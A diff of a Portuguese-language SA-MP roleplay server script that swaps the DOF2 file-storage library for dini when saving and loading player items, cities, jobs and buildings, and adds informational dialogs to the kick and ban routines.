-    DOF2_SetInt(ficheiro, "Capacete", pObjects[playerid][Capacete]);
-    DOF2_SetInt(ficheiro, "CanaDePesca", pObjects[playerid][CanaDePesca]);
-    DOF2_SetInt(ficheiro, "WalkieTalkie", pObjects[playerid][WalkieTalkie]);
-    DOF2_SetInt(ficheiro, "WalkieTalkieFreq", pObjects[playerid][WalkieTalkieFreq]);
-    DOF2_SetInt(ficheiro, "Peixe_Corvina", pObjects[playerid][Peixe_Corvina]);
-    DOF2_SetInt(ficheiro, "Peixe_Congro", pObjects[playerid][Peixe_Congro]);
-    DOF2_SetInt(ficheiro, "Peixe_Robalo", pObjects[playerid][Peixe_Robalo]);
-    DOF2_SetInt(ficheiro, "Peixe_Sargo", pObjects[playerid][Peixe_Sargo]);
-    DOF2_SetInt(ficheiro, "Peixe_Goraz", pObjects[playerid][Peixe_Goraz]);
-    DOF2_SetInt(ficheiro, "Peixe_Cavala", pObjects[playerid][Peixe_Cavala]);
-    DOF2_SetInt(ficheiro, "Peixe_Dourada", pObjects[playerid][Peixe_Dourada]);
-    DOF2_SetInt(ficheiro, "Peixe_Espada", pObjects[playerid][Peixe_Espada]);
-    DOF2_SetInt(ficheiro, "Isco", pObjects[playerid][Isco]);
 
-    DOF2_SaveFile();
+    dini_IntSet(ficheiro, "Mala", pObjects[playerid][Mala]);
+    dini_IntSet(ficheiro, "Mochila", pObjects[playerid][Mochila]);
+    dini_IntSet(ficheiro, "Arma1Mala", pObjects[playerid][Arma1Mala]);
+    dini_IntSet(ficheiro, "Ammo1Mala", pObjects[playerid][Ammo1Mala]);
+    dini_IntSet(ficheiro, "Arma2Mala", pObjects[playerid][Arma2Mala]);
+    dini_IntSet(ficheiro, "Ammo2Mala", pObjects[playerid][Ammo2Mala]);
+    dini_IntSet(ficheiro, "Arma3Mala", pObjects[playerid][Arma3Mala]);
+    dini_IntSet(ficheiro, "Ammo3Mala", pObjects[playerid][Ammo3Mala]);
+    dini_IntSet(ficheiro, "Arma4Mala", pObjects[playerid][Arma4Mala]);
+    dini_IntSet(ficheiro, "Ammo4Mala", pObjects[playerid][Ammo4Mala]);
+    dini_IntSet(ficheiro, "Telemovel", pObjects[playerid][Telemovel]);
+    dini_IntSet(ficheiro, "o_2054", pObjects[playerid][o_2054]);
+    dini_IntSet(ficheiro, "o_18639", pObjects[playerid][o_18639]);
+    dini_IntSet(ficheiro, "o_18943", pObjects[playerid][o_18943]);
+    dini_IntSet(ficheiro, "o_2053", pObjects[playerid][o_2053]);
+    dini_IntSet(ficheiro, "o_2052", pObjects[playerid][o_2052]);
+    dini_IntSet(ficheiro, "o_19160", pObjects[playerid][o_19160]);
+    dini_IntSet(ficheiro, "o_18940", pObjects[playerid][o_18940]);
+    dini_IntSet(ficheiro, "o_18941", pObjects[playerid][o_18941]);
+    dini_IntSet(ficheiro, "o_19011", pObjects[playerid][o_19011]);
+    dini_IntSet(ficheiro, "o_19006", pObjects[playerid][o_19006]);
+    dini_IntSet(ficheiro, "o_19027", pObjects[playerid][o_19027]);
+    dini_IntSet(ficheiro, "o_19007", pObjects[playerid][o_19007]);
+    dini_IntSet(ficheiro, "o_19008", pObjects[playerid][o_19008]);
+    dini_IntSet(ficheiro, "o_19009", pObjects[playerid][o_19009]);
+    dini_IntSet(ficheiro, "o_19010", pObjects[playerid][o_19010]);
+    dini_IntSet(ficheiro, "o_19010", pObjects[playerid][o_19010]);
+    dini_IntSet(ficheiro, "o_19011", pObjects[playerid][o_19011]);
+    dini_IntSet(ficheiro, "o_19012", pObjects[playerid][o_19012]);
+    dini_IntSet(ficheiro, "o_19013", pObjects[playerid][o_19013]);
+    dini_IntSet(ficheiro, "o_19014", pObjects[playerid][o_19014]);
+    dini_IntSet(ficheiro, "o_19015", pObjects[playerid][o_19015]);
+    dini_IntSet(ficheiro, "o_19016", pObjects[playerid][o_19016]);
+    dini_IntSet(ficheiro, "o_19017", pObjects[playerid][o_19017]);
+    dini_IntSet(ficheiro, "o_19018", pObjects[playerid][o_19018]);
+    dini_IntSet(ficheiro, "Radio", pObjects[playerid][Radio]);
+    dini_IntSet(ficheiro, "Arma1Mochila", pObjects[playerid][Arma1Mochila]);
+    dini_IntSet(ficheiro, "Ammo1Mochila", pObjects[playerid][Ammo1Mochila]);
+    dini_IntSet(ficheiro, "Arma2Mochila", pObjects[playerid][Arma2Mochila]);
+    dini_IntSet(ficheiro, "Ammo2Mochila", pObjects[playerid][Ammo2Mochila]);
+    dini_IntSet(ficheiro, "Arma3Mochila", pObjects[playerid][Arma3Mochila]);
+    dini_IntSet(ficheiro, "Ammo3Mochila", pObjects[playerid][Ammo3Mochila]);
+    dini_IntSet(ficheiro, "Arma4Mochila", pObjects[playerid][Arma4Mochila]);
+    dini_IntSet(ficheiro, "Ammo4Mochila", pObjects[playerid][Ammo4Mochila]);
+    dini_IntSet(ficheiro, "Bidom", pObjects[playerid][Bidom]);
+    dini_IntSet(ficheiro, "ListaTel", pObjects[playerid][ListaTel]);
+    dini_IntSet(ficheiro, "Mascara", pObjects[playerid][Mascara]);
+    dini_IntSet(ficheiro, "Corda", pObjects[playerid][Corda]);
+    dini_IntSet(ficheiro, "Venda", pObjects[playerid][Venda]);
+    dini_IntSet(ficheiro, "Capacete", pObjects[playerid][Capacete]);
+    dini_IntSet(ficheiro, "CanaDePesca", pObjects[playerid][CanaDePesca]);
+    dini_IntSet(ficheiro, "WalkieTalkie", pObjects[playerid][WalkieTalkie]);
+    dini_IntSet(ficheiro, "WalkieTalkieFreq", pObjects[playerid][WalkieTalkieFreq]);
+    dini_IntSet(ficheiro, "Peixe_Corvina", pObjects[playerid][Peixe_Corvina]);
+    dini_IntSet(ficheiro, "Peixe_Congro", pObjects[playerid][Peixe_Congro]);
+    dini_IntSet(ficheiro, "Peixe_Robalo", pObjects[playerid][Peixe_Robalo]);
+    dini_IntSet(ficheiro, "Peixe_Sargo", pObjects[playerid][Peixe_Sargo]);
+    dini_IntSet(ficheiro, "Peixe_Goraz", pObjects[playerid][Peixe_Goraz]);
+    dini_IntSet(ficheiro, "Peixe_Cavala", pObjects[playerid][Peixe_Cavala]);
+    dini_IntSet(ficheiro, "Peixe_Dourada", pObjects[playerid][Peixe_Dourada]);
+    dini_IntSet(ficheiro, "Peixe_Espada", pObjects[playerid][Peixe_Espada]);
+    dini_IntSet(ficheiro, "Isco", pObjects[playerid][Isco]);
 
 	return 1;
 }
 
 public KickPlayer(playerid, kickedby[MAX_PLAYER_NAME], reason[])
 {
-	new string[256];
+	new string[128], sdialog[512];
 
 	format(string,sizeof(string),"%s kickou %s. Razão: %s", kickedby, GetPlayerNameEx(playerid), reason);
 	SendClientMessageToAll(COLOR_CHAT, string);
-	
+
  	AntiSpamAC[playerid] = 1;
+ 	pInfo[playerid][Kicks]++;
  	GuardarJogador(playerid);
- 	
+
+	format(string, sizeof(string), "{FFFFFF}Foste {CC3300}kickado {FFFFFF}do servidor."); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Kickado por: {FFCC66}%s", kickedby); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Razão: {FFCC66}%s", reason); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Data do kick: {FFCC66}%s", GetDate()); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Número de kicks: {FFCC66}%d", pInfo[playerid][Kicks]); strcat(sdialog,string);
+
+	ShowPlayerDialog(playerid, DIALOG_TUTORIAL1, DIALOG_STYLE_MSGBOX, "KICK - Informações", sdialog, "Ok", "");
+
 	KickLog(playerid, kickedby, reason);
 
-	SetTimerEx("KickT", 50, false, "i", playerid);
+	SetPlayerTimer(playerid, "KickT", 50, false);
 
 	return 1;
 }
 
 public BanPlayer(playerid, kickedby[MAX_PLAYER_NAME], reason[])
 {
-	new string[256];
+	new string[128], sdialog[512];
 
 	format(string,sizeof(string),"%s baniu o jogador %s. Razão: %s", kickedby, GetPlayerNameEx(playerid), reason);
 	SendClientMessageToAll(COLOR_CHAT, string);
-	
+
 	pInfo[playerid][Banido] = 1;
 	GuardarJogador(playerid);
-	
+
+	format(string, sizeof(string), "{FFFFFF}Foste {CC3300}banido {FFFFFF}do servidor."); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Banido por: {FFCC66}%s", kickedby); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Razão: {FFCC66}%s", reason); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Data do ban: {FFCC66}%s", GetDate()); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Ban tipo: {FFCC66}Conta"); strcat(sdialog,string);
+
+	ShowPlayerDialog(playerid, DIALOG_TUTORIAL1, DIALOG_STYLE_MSGBOX, "BAN - Informações", sdialog, "Ok", "");
+
 	BanLog(playerid, kickedby, reason);
 
-	SetTimerEx("KickT", 50, false, "i", playerid);
+	SetPlayerTimer(playerid, "KickT", 50, false);
 
 	return 1;
 }
 
 public BanPlayerIP(playerid, kickedby[MAX_PLAYER_NAME], reason[])
 {
-	new string[256];
+	new string[128], sdialog[512];
 
 	format(string,sizeof(string),"%s baniu o jogador %s. Razão: %s", kickedby, GetPlayerNameEx(playerid), reason);
 	SendClientMessageToAll(COLOR_CHAT, string);
-	
+
+	pInfo[playerid][Banido] = 1;
+	GuardarJogador(playerid);
+
 	Ban(playerid);
-	
+
 	new szCmd[64], pIp[16];
 	GetPlayerIp(playerid, pIp, sizeof(pIp));
 	format(szCmd, sizeof(szCmd), "banip %s", pIp);
-	
 	SendRconCommand(szCmd);
-	pInfo[playerid][Banido] = 1;
-	GuardarJogador(playerid);
+
+	format(string, sizeof(string), "{FFFFFF}Foste {CC3300}banido {FFFFFF}do servidor."); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Banido por: {FFCC66}%s", kickedby); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Razão: {FFCC66}%s", reason); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Data do ban: {FFCC66}%s", GetDate()); strcat(sdialog,string);
+	format(string, sizeof(string), "\n{FFFFFF}Ban tipo: {FFCC66}Conta e IP"); strcat(sdialog,string);
+
+	ShowPlayerDialog(playerid, DIALOG_TUTORIAL1, DIALOG_STYLE_MSGBOX, "BAN - Informações", sdialog, "Ok", "");
 
 	BanLog(playerid, kickedby, reason);
 
@@ -11412,65 +11441,61 @@ public BanPlayerIP(playerid, kickedby[MAX_PLAYER_NAME], reason[])
 public CarregarCidades()
 {
 	new ficheiro[64];
-	
+
 	new tick1;
 	new tick2;
 
 	tick1 = GetTickCount();
-	
+
 	for(new i = 0; i < MAX_CIDADES; i++)
 	{
 		format(ficheiro, sizeof(ficheiro), "PCRP/Cidades/%d.ini", i);
-		
- 		if(!DOF2_FileExists(ficheiro))
+
+ 		if(!dini_Exists(ficheiro))
  		{
- 		    DOF2_CreateFile(ficheiro);
- 		    
- 		    DOF2_SetString(ficheiro, "Nome", "Unused");
-       		DOF2_SetFloat(ficheiro, "X", 0);
-       		DOF2_SetFloat(ficheiro, "Y", 0);
-       		DOF2_SetFloat(ficheiro, "Z", 0);
-       		DOF2_SetFloat(ficheiro, "A", 0);
-       		DOF2_SetInt(ficheiro, "Interior", 0);
-       		DOF2_SetInt(ficheiro, "VirtualWorld", 0);
-       		
-       		DOF2_SaveFile();
+ 		    dini_Create(ficheiro);
+
+ 		    dini_Set(ficheiro, "Nome", "Unused");
+       		dini_FloatSet(ficheiro, "X", 0);
+       		dini_FloatSet(ficheiro, "Y", 0);
+       		dini_FloatSet(ficheiro, "Z", 0);
+       		dini_FloatSet(ficheiro, "A", 0);
+       		dini_IntSet(ficheiro, "Interior", 0);
+       		dini_IntSet(ficheiro, "VirtualWorld", 0);
  		}
  		else
  		{
- 		    format(SpawnInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
- 		    SpawnInfo[i][X] = DOF2_GetFloat(ficheiro, "X");
- 		    SpawnInfo[i][Z] = DOF2_GetFloat(ficheiro, "Z");
- 		    SpawnInfo[i][Y] = DOF2_GetFloat(ficheiro, "Y");
- 		    SpawnInfo[i][A] = DOF2_GetFloat(ficheiro, "A");
- 		    SpawnInfo[i][Interior] = DOF2_GetInt(ficheiro, "Interior");
- 		    SpawnInfo[i][VirtualWorld] = DOF2_GetInt(ficheiro, "VirtualWorld");
+ 		    format(SpawnInfo[i][Nome], 32, "%s", dini_Get(ficheiro, "Nome"));
+ 		    SpawnInfo[i][X] = dini_Float(ficheiro, "X");
+ 		    SpawnInfo[i][Z] = dini_Float(ficheiro, "Z");
+ 		    SpawnInfo[i][Y] = dini_Float(ficheiro, "Y");
+ 		    SpawnInfo[i][A] = dini_Float(ficheiro, "A");
+ 		    SpawnInfo[i][Interior] = dini_Int(ficheiro, "Interior");
+ 		    SpawnInfo[i][VirtualWorld] = dini_Int(ficheiro, "VirtualWorld");
  		}
 	}
-	
+
 	tick2 = GetTickCount();
-	
-	printf("\n [PC:RP] Cidades carregadas (%d ms)", tick2-tick1);
+
+	printf(" [PC:RP] Cidades carregadas (%d ms)", tick2-tick1);
 	return 1;
 }
 
 public GuardarCidades()
 {
 	new ficheiro[64];
-	
+
 	for(new i = 0; i < MAX_CIDADES; i++)
 	{
 		format(ficheiro, sizeof(ficheiro), "PCRP/Cidades/%d.ini", i);
-		
-		DOF2_SetString(ficheiro, "Nome", SpawnInfo[i][Nome]);
-		DOF2_SetFloat(ficheiro, "X", SpawnInfo[i][X]);
-		DOF2_SetFloat(ficheiro, "Y", SpawnInfo[i][Y]);
-		DOF2_SetFloat(ficheiro, "Z", SpawnInfo[i][Z]);
-		DOF2_SetFloat(ficheiro, "A", SpawnInfo[i][A]);
-		DOF2_SetInt(ficheiro, "Interior", SpawnInfo[i][Interior]);
-		DOF2_SetInt(ficheiro, "VirtualWorld", SpawnInfo[i][VirtualWorld]);
 
-		DOF2_SaveFile();
+		dini_Set(ficheiro, "Nome", SpawnInfo[i][Nome]);
+		dini_FloatSet(ficheiro, "X", SpawnInfo[i][X]);
+		dini_FloatSet(ficheiro, "Y", SpawnInfo[i][Y]);
+		dini_FloatSet(ficheiro, "Z", SpawnInfo[i][Z]);
+		dini_FloatSet(ficheiro, "A", SpawnInfo[i][A]);
+		dini_IntSet(ficheiro, "Interior", SpawnInfo[i][Interior]);
+		dini_IntSet(ficheiro, "VirtualWorld", SpawnInfo[i][VirtualWorld]);
 	}
 
 	return 1;
@@ -11483,14 +11508,12 @@ public GuardarCidade(id)
 
 	format(ficheiro, sizeof(ficheiro), "PCRP/Cidades/%d.ini", i);
 
-	DOF2_SetFloat(ficheiro, "X", SpawnInfo[i][X]);
-	DOF2_SetFloat(ficheiro, "Y", SpawnInfo[i][Y]);
-	DOF2_SetFloat(ficheiro, "Z", SpawnInfo[i][Z]);
-	DOF2_SetFloat(ficheiro, "A", SpawnInfo[i][A]);
-	DOF2_SetInt(ficheiro, "Interior", SpawnInfo[i][Interior]);
-	DOF2_SetInt(ficheiro, "VirtualWorld", SpawnInfo[i][VirtualWorld]);
-
-	DOF2_SaveFile();
+	dini_FloatSet(ficheiro, "X", SpawnInfo[i][X]);
+	dini_FloatSet(ficheiro, "Y", SpawnInfo[i][Y]);
+	dini_FloatSet(ficheiro, "Z", SpawnInfo[i][Z]);
+	dini_FloatSet(ficheiro, "A", SpawnInfo[i][A]);
+	dini_IntSet(ficheiro, "Interior", SpawnInfo[i][Interior]);
+	dini_IntSet(ficheiro, "VirtualWorld", SpawnInfo[i][VirtualWorld]);
 
 	return 1;
 }
@@ -11508,37 +11531,35 @@ public CarregarJobs()
 	    if(i == 0) continue;
 		format(ficheiro, sizeof(ficheiro), "PCRP/Jobs/%d.ini", i);
 
- 		if(!DOF2_FileExists(ficheiro))
+ 		if(!dini_Exists(ficheiro))
  		{
- 		    DOF2_CreateFile(ficheiro);
+ 		    dini_Create(ficheiro);
 
-            DOF2_SetInt(ficheiro, "ID", i);
-       		DOF2_SetString(ficheiro, "Nome", "Unused");
-       		DOF2_SetInt(ficheiro, "Salario", 0);
-       		DOF2_SetInt(ficheiro, "RotaSalario", 0);
-       		DOF2_SetInt(ficheiro, "Ligeiros", 0);
-       		DOF2_SetInt(ficheiro, "Pesados", 0);
-       		DOF2_SetInt(ficheiro, "Motociclos", 0);
-       		DOF2_SetInt(ficheiro, "Barco", 0);
-
-       		DOF2_SaveFile();
+            dini_IntSet(ficheiro, "ID", i);
+       		dini_Set(ficheiro, "Nome", "Unused");
+       		dini_IntSet(ficheiro, "Salario", 0);
+       		dini_IntSet(ficheiro, "RotaSalario", 0);
+       		dini_IntSet(ficheiro, "Ligeiros", 0);
+       		dini_IntSet(ficheiro, "Pesados", 0);
+       		dini_IntSet(ficheiro, "Motociclos", 0);
+       		dini_IntSet(ficheiro, "Barco", 0);
  		}
  		else
  		{
  		    jInfo[i][ID] = i;
- 		    format(jInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
- 		    jInfo[i][Salario] = DOF2_GetInt(ficheiro, "Salario");
- 		    jInfo[i][RotaSalario] = DOF2_GetInt(ficheiro, "RotaSalario");
- 		    jInfo[i][Ligeiros] = DOF2_GetInt(ficheiro, "Ligeiros");
- 		    jInfo[i][Pesados] = DOF2_GetInt(ficheiro, "Pesados");
- 		    jInfo[i][Motociclos] = DOF2_GetInt(ficheiro, "Motociclos");
- 		    jInfo[i][Barco] = DOF2_GetInt(ficheiro, "Barco");
+ 		    format(jInfo[i][Nome], 32, "%s", dini_Get(ficheiro, "Nome"));
+ 		    jInfo[i][Salario] = dini_Int(ficheiro, "Salario");
+ 		    jInfo[i][RotaSalario] = dini_Int(ficheiro, "RotaSalario");
+ 		    jInfo[i][Ligeiros] = dini_Int(ficheiro, "Ligeiros");
+ 		    jInfo[i][Pesados] = dini_Int(ficheiro, "Pesados");
+ 		    jInfo[i][Motociclos] = dini_Int(ficheiro, "Motociclos");
+ 		    jInfo[i][Barco] = dini_Int(ficheiro, "Barco");
  		}
 	}
-	
+
 	tick2 = GetTickCount();
-	printf("\n [PC:RP] Jobs carregados (%d ms)", tick2-tick1);
-	
+	printf(" [PC:RP] Jobs carregados (%d ms)", tick2-tick1);
+
 	return 1;
 }
 
@@ -11551,16 +11572,14 @@ public GuardarJobs()
 	    if(i == 0) continue;
 		format(ficheiro, sizeof(ficheiro), "PCRP/Jobs/%d.ini", i);
 
-        DOF2_SetInt(ficheiro, "ID", i);
-		DOF2_SetString(ficheiro, "Nome", jInfo[i][Nome]);
-		DOF2_SetInt(ficheiro, "Salario", jInfo[i][Salario]);
-		DOF2_SetInt(ficheiro, "RotaSalario", jInfo[i][RotaSalario]);
-		DOF2_SetInt(ficheiro, "Ligeiros", jInfo[i][Ligeiros]);
-		DOF2_SetInt(ficheiro, "Pesados", jInfo[i][Pesados]);
-		DOF2_SetInt(ficheiro, "Motociclos", jInfo[i][Motociclos]);
-		DOF2_SetInt(ficheiro, "Barco", jInfo[i][Barco]);
-
-		DOF2_SaveFile();
+        dini_IntSet(ficheiro, "ID", i);
+		dini_Set(ficheiro, "Nome", jInfo[i][Nome]);
+		dini_IntSet(ficheiro, "Salario", jInfo[i][Salario]);
+		dini_IntSet(ficheiro, "RotaSalario", jInfo[i][RotaSalario]);
+		dini_IntSet(ficheiro, "Ligeiros", jInfo[i][Ligeiros]);
+		dini_IntSet(ficheiro, "Pesados", jInfo[i][Pesados]);
+		dini_IntSet(ficheiro, "Motociclos", jInfo[i][Motociclos]);
+		dini_IntSet(ficheiro, "Barco", jInfo[i][Barco]);
 	}
 
 	return 1;
@@ -11570,19 +11589,17 @@ public GuardarJob(id)
 {
 	new ficheiro[64];
 	new i = id;
-	
+
 	format(ficheiro, sizeof(ficheiro), "PCRP/Jobs/%d.ini", i);
 
-	DOF2_SetInt(ficheiro, "ID", i);
-	DOF2_SetString(ficheiro, "Nome", jInfo[i][Nome]);
-	DOF2_SetInt(ficheiro, "Salario", jInfo[i][Salario]);
-	DOF2_SetInt(ficheiro, "RotaSalario", jInfo[i][RotaSalario]);
-	DOF2_SetInt(ficheiro, "Ligeiros", jInfo[i][Ligeiros]);
-	DOF2_SetInt(ficheiro, "Pesados", jInfo[i][Pesados]);
-	DOF2_SetInt(ficheiro, "Motociclos", jInfo[i][Motociclos]);
-	DOF2_SetInt(ficheiro, "Barco", jInfo[i][Barco]);
-
-	DOF2_SaveFile();
+	dini_IntSet(ficheiro, "ID", i);
+	dini_Set(ficheiro, "Nome", jInfo[i][Nome]);
+	dini_IntSet(ficheiro, "Salario", jInfo[i][Salario]);
+	dini_IntSet(ficheiro, "RotaSalario", jInfo[i][RotaSalario]);
+	dini_IntSet(ficheiro, "Ligeiros", jInfo[i][Ligeiros]);
+	dini_IntSet(ficheiro, "Pesados", jInfo[i][Pesados]);
+	dini_IntSet(ficheiro, "Motociclos", jInfo[i][Motociclos]);
+	dini_IntSet(ficheiro, "Barco", jInfo[i][Barco]);
 
 	return 1;
 }
@@ -11600,53 +11617,51 @@ public CarregarBuildings()
 	    if(i == 0) continue;
 
     	format(ficheiro, sizeof(ficheiro), "PCRP/Buildings/%d.ini", i);
-    	if(!DOF2_FileExists(ficheiro))
+    	if(!dini_Exists(ficheiro))
   		{
-	  		DOF2_CreateFile(ficheiro);
+	  		dini_Create(ficheiro);
 
-            DOF2_SetInt(ficheiro, "ID", i);
-            DOF2_SetString(ficheiro, "Nome", "Unused");
-  			DOF2_SetFloat(ficheiro, "EnterX", 0);
-  			DOF2_SetFloat(ficheiro, "EnterY", 0);
-  			DOF2_SetFloat(ficheiro, "EnterZ", 0);
-  			DOF2_SetFloat(ficheiro, "EnterAngle", 0);
-  			DOF2_SetInt(ficheiro, "EnterInterior", 0);
-  			DOF2_SetInt(ficheiro, "EnterVirtualWorld", 0);
-            DOF2_SetFloat(ficheiro, "ExitX", 0);
-            DOF2_SetFloat(ficheiro, "ExitY", 0);
-            DOF2_SetFloat(ficheiro, "ExitZ", 0);
-            DOF2_SetFloat(ficheiro, "ExitAngle", 0);
-  			DOF2_SetInt(ficheiro, "Interior", 0);
-  			DOF2_SetInt(ficheiro, "VirtualWorld", i);
-            DOF2_SetInt(ficheiro, "PickupID", 1559);
-            DOF2_SetInt(ficheiro, "Locked", 1);
-
-    		DOF2_SaveFile();
+            dini_IntSet(ficheiro, "ID", i);
+            dini_Set(ficheiro, "Nome", "Unused");
+  			dini_FloatSet(ficheiro, "EnterX", 0);
+  			dini_FloatSet(ficheiro, "EnterY", 0);
+  			dini_FloatSet(ficheiro, "EnterZ", 0);
+  			dini_FloatSet(ficheiro, "EnterAngle", 0);
+  			dini_IntSet(ficheiro, "EnterInterior", 0);
+  			dini_IntSet(ficheiro, "EnterVirtualWorld", 0);
+            dini_FloatSet(ficheiro, "ExitX", 0);
+            dini_FloatSet(ficheiro, "ExitY", 0);
+            dini_FloatSet(ficheiro, "ExitZ", 0);
+            dini_FloatSet(ficheiro, "ExitAngle", 0);
+  			dini_IntSet(ficheiro, "Interior", 0);
+  			dini_IntSet(ficheiro, "VirtualWorld", i);
+            dini_IntSet(ficheiro, "PickupID", 1559);
+            dini_IntSet(ficheiro, "Locked", 1);
    		}
    		else
    		{
-   		    buInfo[i][ID] = DOF2_GetInt(ficheiro, "ID");
-   		    format(buInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
-   		    buInfo[i][EnterX] = DOF2_GetFloat(ficheiro, "EnterX");
-   		    buInfo[i][EnterY] = DOF2_GetFloat(ficheiro, "EnterY");
-   		    buInfo[i][EnterZ] = DOF2_GetFloat(ficheiro, "EnterZ");
-   		    buInfo[i][EnterAngle] = DOF2_GetFloat(ficheiro, "EnterAngle");
-   		    buInfo[i][EnterInterior] = DOF2_GetInt(ficheiro, "EnterInterior");
-   		    buInfo[i][EnterVirtualWorld] = DOF2_GetInt(ficheiro, "EnterVirtualWorld");
-   		    buInfo[i][ExitX] = DOF2_GetFloat(ficheiro, "ExitX");
-   		    buInfo[i][ExitY] = DOF2_GetFloat(ficheiro, "ExitY");
-   		    buInfo[i][ExitZ] = DOF2_GetFloat(ficheiro, "ExitZ");
-   		    buInfo[i][ExitAngle] = DOF2_GetFloat(ficheiro, "ExitAngle");
-   		    buInfo[i][Interior] = DOF2_GetInt(ficheiro, "Interior");
-   		    buInfo[i][VirtualWorld] = DOF2_GetInt(ficheiro, "VirtualWorld");
-   		    buInfo[i][PickupID] = DOF2_GetInt(ficheiro, "PickupID");
-   		    buInfo[i][Locked] = DOF2_GetInt(ficheiro, "Locked");
+   		    buInfo[i][ID] = dini_Int(ficheiro, "ID");
+   		    format(buInfo[i][Nome], 32, "%s", dini_Get(ficheiro, "Nome"));
+   		    buInfo[i][EnterX] = dini_Float(ficheiro, "EnterX");
+   		    buInfo[i][EnterY] = dini_Float(ficheiro, "EnterY");
+   		    buInfo[i][EnterZ] = dini_Float(ficheiro, "EnterZ");
+   		    buInfo[i][EnterAngle] = dini_Float(ficheiro, "EnterAngle");
+   		    buInfo[i][EnterInterior] = dini_Int(ficheiro, "EnterInterior");
+   		    buInfo[i][EnterVirtualWorld] = dini_Int(ficheiro, "EnterVirtualWorld");
+   		    buInfo[i][ExitX] = dini_Float(ficheiro, "ExitX");
+   		    buInfo[i][ExitY] = dini_Float(ficheiro, "ExitY");
+   		    buInfo[i][ExitZ] = dini_Float(ficheiro, "ExitZ");
+   		    buInfo[i][ExitAngle] = dini_Float(ficheiro, "ExitAngle");
+   		    buInfo[i][Interior] = dini_Int(ficheiro, "Interior");
+   		    buInfo[i][VirtualWorld] = dini_Int(ficheiro, "VirtualWorld");
+   		    buInfo[i][PickupID] = dini_Int(ficheiro, "PickupID");
+   		    buInfo[i][Locked] = dini_Int(ficheiro, "Locked");
 		}
 		AtualizarBuilding(i);
 	}
-	
+
 	tick2 = GetTickCount();
-	printf("\n [PC:RP] Buildings carregados (%d ms)", tick2-tick1);
+	printf(" [PC:RP] Buildings carregados (%d ms)", tick2-tick1);
 
 	return 1;
 }
@@ -11659,24 +11674,22 @@ public GuardarBuildings()
 	    if(i == 0) continue;
 	    format(ficheiro, sizeof(ficheiro), "PCRP/Buildings/%d.ini", i);
 
-		DOF2_SetInt(ficheiro, "ID", i);
-		DOF2_SetString(ficheiro, "Nome", buInfo[i][Nome]);
-		DOF2_SetFloat(ficheiro, "EnterX", buInfo[i][EnterX]);
-		DOF2_SetFloat(ficheiro, "EnterY", buInfo[i][EnterY]);
-		DOF2_SetFloat(ficheiro, "EnterZ", buInfo[i][EnterZ]);
-		DOF2_SetFloat(ficheiro, "EnterAngle", buInfo[i][EnterAngle]);
-		DOF2_SetInt(ficheiro, "EnterInterior", buInfo[i][EnterInterior]);
-		DOF2_SetInt(ficheiro, "EnterVirtualWorld", buInfo[i][EnterVirtualWorld]);
-		DOF2_SetFloat(ficheiro, "ExitX", buInfo[i][ExitX]);
-		DOF2_SetFloat(ficheiro, "ExitY", buInfo[i][ExitY]);
-		DOF2_SetFloat(ficheiro, "ExitZ", buInfo[i][ExitZ]);
-		DOF2_SetFloat(ficheiro, "ExitAngle", buInfo[i][ExitAngle]);
-		DOF2_SetInt(ficheiro, "Interior", buInfo[i][Interior]);
-		DOF2_SetInt(ficheiro, "VirtualWorld", i);
-		DOF2_SetInt(ficheiro, "PickupID", buInfo[i][PickupID]);
-		DOF2_SetInt(ficheiro, "Locked", buInfo[i][Locked]);
-
-		DOF2_SaveFile();
+		dini_IntSet(ficheiro, "ID", i);
+		dini_Set(ficheiro, "Nome", buInfo[i][Nome]);
+		dini_FloatSet(ficheiro, "EnterX", buInfo[i][EnterX]);
+		dini_FloatSet(ficheiro, "EnterY", buInfo[i][EnterY]);
+		dini_FloatSet(ficheiro, "EnterZ", buInfo[i][EnterZ]);
+		dini_FloatSet(ficheiro, "EnterAngle", buInfo[i][EnterAngle]);
+		dini_IntSet(ficheiro, "EnterInterior", buInfo[i][EnterInterior]);
+		dini_IntSet(ficheiro, "EnterVirtualWorld", buInfo[i][EnterVirtualWorld]);
+		dini_FloatSet(ficheiro, "ExitX", buInfo[i][ExitX]);
+		dini_FloatSet(ficheiro, "ExitY", buInfo[i][ExitY]);
+		dini_FloatSet(ficheiro, "ExitZ", buInfo[i][ExitZ]);
+		dini_FloatSet(ficheiro, "ExitAngle", buInfo[i][ExitAngle]);
+		dini_IntSet(ficheiro, "Interior", buInfo[i][Interior]);
+		dini_IntSet(ficheiro, "VirtualWorld", i);
+		dini_IntSet(ficheiro, "PickupID", buInfo[i][PickupID]);
+		dini_IntSet(ficheiro, "Locked", buInfo[i][Locked]);
 
 	}
 	return 1;
@@ -11689,24 +11702,22 @@ public GuardarBuilding(id)
 
 	format(ficheiro, sizeof(ficheiro), "PCRP/Buildings/%d.ini", i);
 
-	DOF2_SetInt(ficheiro, "ID", i);
-	DOF2_SetString(ficheiro, "Nome", buInfo[i][Nome]);
-	DOF2_SetFloat(ficheiro, "EnterX", buInfo[i][EnterX]);
-	DOF2_SetFloat(ficheiro, "EnterY", buInfo[i][EnterY]);
-	DOF2_SetFloat(ficheiro, "EnterZ", buInfo[i][EnterZ]);
-	DOF2_SetFloat(ficheiro, "EnterAngle", buInfo[i][EnterAngle]);
-	DOF2_SetInt(ficheiro, "EnterInterior", buInfo[i][EnterInterior]);
-	DOF2_SetInt(ficheiro, "EnterVirtualWorld", buInfo[i][EnterVirtualWorld]);
-	DOF2_SetFloat(ficheiro, "ExitX", buInfo[i][ExitX]);
-	DOF2_SetFloat(ficheiro, "ExitY", buInfo[i][ExitY]);
-	DOF2_SetFloat(ficheiro, "ExitZ", buInfo[i][ExitZ]);
